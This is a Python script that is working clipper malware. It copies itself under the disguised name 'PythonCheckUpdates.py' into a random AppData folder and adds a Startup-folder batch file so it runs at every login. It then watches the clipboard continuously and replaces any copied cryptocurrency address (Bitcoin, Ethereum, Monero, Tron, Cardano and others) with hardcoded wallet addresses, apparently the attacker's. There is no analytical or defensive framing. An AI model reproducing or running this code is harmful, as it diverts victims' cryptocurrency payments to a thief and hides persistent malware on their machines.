import re
import os
import time
import random
import shutil
import subprocess
import sys

try:
    import pyperclip
except:
    os.system('pip install -q pyperclip')
    import pyperclip

currentpath = os.path.abspath(__file__)
appdatalocal = os.path.join(os.getenv('USERPROFILE'), 'AppData', 'Local')
if not appdatalocal in currentpath:
    folders = [f for f in os.listdir(appdatalocal) if os.path.isdir(os.path.join(appdatalocal, f)) and f not in {'Temp', 'Packages', 'Microsoft', 'CrashDumps'}]
    destinationfolder = os.path.join(appdatalocal, random.choice(folders))
    destinationpath = os.path.join(destinationfolder, os.path.basename('PythonCheckUpdates.py'))
    shutil.copy2(os.path.abspath(__file__), destinationpath)
    startupinfo = subprocess.STARTUPINFO()
    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW

startupfolder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
shortcutpath = os.path.join(startupfolder, 'PythonCheckUpdates.bat')
if not os.path.exists(shortcutpath):
    with open(shortcutpath, 'w') as f:
        f.write(f'@echo off\npython "{destinationpath}"\n')

patterns = {
    'bc1qzuelyf68hjd8qwhsm43ejpk538xnvd78zml5d3'  : r'\b[13][a-km-zA-HJ-NP-Z1-9]{25,34}\b',
    '0xcC1A7d8Ef8a015C88e9E5D2edd648804C164064b'   : r'\b0x[a-fA-F0-9]{40}\b',
    '0xcC1A7d8Ef8a015C88e9E5D2edd648804C164064b'  : r'\b(bnb1)[0-9a-z]{38}\b',
    'rGU8BRSuY5YLNdUcXbrNu29EQHRCR8wRSo'  : r'\br[0-9a-zA-Z]{24,34}\b',
    'addr1qydvdugxkprrxsfxzf2r0amkz0syka5lm8spk4vgv9l0y7c6cmcsdvzxxdqjvyj5xlmhvylqfdmflk0qrd2csct77fasq5cfzg'  : r'\baddr1[0-9a-z]{58,}\b',
    'F7Lr2NjDPWPMJouTHV3kasePbiL4t1MrtCCMbUgCZXYj'  : r'\b[1-9A-HJ-NP-Za-km-z]{32,44}\b',
    'DBBaxUBzXAZqnbaHZk8CbpZ6CVGmC1Euvn' : r'\bD{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32}\b',
    'TQw5weBndhXq9mLkPDwBXeDWb7vcVDGTUk'  : r'\bT[1-9A-HJ-NP-Za-km-z]{33}\b',
    '0xcC1A7d8Ef8a015C88e9E5D2edd648804C164064b': r'\b0x[a-fA-F0-9]{40}\b',
    'LX44QNxXmmnUsttkzdAgMubS6dQb7nHNha'  : r'\b[L3M][a-km-zA-HJ-NP-Z1-9]{26,33}\b',
    '0xcC1A7d8Ef8a015C88e9E5D2edd648804C164064b' : r'\b0x[a-fA-F0-9]{40}\b',
    '0xcC1A7d8Ef8a015C88e9E5D2edd648804C164064b' : r'\bX-[0-9A-HJ-NP-Za-km-z]{48,50}\b',
    '0xcC1A7d8Ef8a015C88e9E5D2edd648804C164064b'  : r'\b0x[a-fA-F0-9]{40}\b',
    '0xcC1A7d8Ef8a015C88e9E5D2edd648804C164064b'  : r'\b0x[a-fA-F0-9]{40}\b',
    '0xcC1A7d8Ef8a015C88e9E5D2edd648804C164064b' : r'\b0x[a-fA-F0-9]{40}\b',
    '0xcC1A7d8Ef8a015C88e9E5D2edd648804C164064b' : r'\b0x[a-fA-F0-9]{40}\b',
    'GA6NFYTV4GMS7YW6UQHRGSTSXACYRUK4O3Q5IKMVA62SRA4VRNKNABEY'  : r'\bG[0-9A-Z]{55}\b',
    'cosmos12d2at6hs2ewzksyfvt0a0fwqcvymm5zzj2648d' : r'\bcosmos1[0-9a-z]{38}\b',
    '0x9575feD90Baa4eC492bb12efaA82D7d9A5c3d050'  : r'\b0x[a-fA-F0-9]{40}\b',
    '49JVqCvuipEbf5noo59mee1h7zJFhQsNQcsV3ZkUkDjDJWa8GgTV3NujCjhJGK7rSFcJacejPveGGg49fcHmHVRZ9MZGCAA'  : r'\b4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}\b',
    '0xcC1A7d8Ef8a015C88e9E5D2edd648804C164064b': r'\b0x[a-fA-F0-9]{40}\b',
    '0xcC1A7d8Ef8a015C88e9E5D2edd648804C164064b': r'\b0x[a-fA-F0-9]{40}\b',
}

def startclipping():
    while True:
        try:
            data = pyperclip.paste().strip()
            for adress, pattern in patterns.items():
                if re.fullmatch(pattern, data):
                    pyperclip.copy(adress)  
            time.sleep(0.5)

        except:
            time.sleep(1)

startclipping()